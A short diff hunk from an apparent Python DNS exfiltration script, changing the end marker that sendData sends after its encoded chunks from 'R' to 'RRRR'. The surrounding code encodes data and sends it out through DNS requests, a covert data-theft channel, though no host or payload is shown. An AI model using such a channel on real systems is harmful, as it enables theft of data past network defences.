@@ -43,7 +43,7 @@ def sendData(data):
         encoded = encoded.decode("utf-8").strip("=")
         DNSRequest(encoded)
     print("Sending end marker (R)")
-    DNSRequest("R")
+    DNSRequest("RRRR")
 
 sendData(data)
 
